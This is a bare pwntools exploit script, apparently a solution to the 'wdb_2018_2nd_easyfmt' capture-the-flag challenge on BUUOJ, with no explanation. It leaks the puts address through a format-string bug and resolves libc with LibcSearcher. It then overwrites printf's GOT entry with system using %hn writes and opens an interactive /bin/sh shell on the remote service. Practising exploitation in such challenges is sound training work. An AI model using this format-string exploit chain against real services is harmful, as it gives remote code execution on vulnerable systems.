from pwn import *
from LibcSearcher import *

context.log_level="debug"

p=remote("node5.buuoj.cn",25423)
elf=ELF("/home/lixingjian/pwn/wdb_2018_2nd_easyfmt") 

p.recvuntil(b"repeater?")


puts_got = elf.got['puts']
payload = p32(puts_got) + b'%6$s'
p.sendline(payload)

recv=p.recvuntil(b'\xf7')

puts_libc=u32(recv[-4:])
log.success(hex(puts_libc))
libc=LibcSearcher('puts',puts_libc)

puts_offset = libc.dump('puts')
libc_base = puts_libc - puts_offset
system_addr = libc_base + libc.dump('system')
log.success(hex(system_addr))

printf_got = elf.got['printf']  
log.success(hex(printf_got))

system_low = system_addr & 0xffff
system_high = (system_addr >> 16) & 0xffff
log.success(hex(system_low))
log.success(hex(system_high))

payload = p32(printf_got) + p32(printf_got + 2)
payload += b'%' + bytes(str(system_low - 8), "utf-8") + b'c%6$hn'
payload += b'%' + bytes(str(system_high-system_low), "utf-8") + b'c%7$hn'


p.sendline(payload)
p.send(b"/bin/sh\x00")

p.interactive()
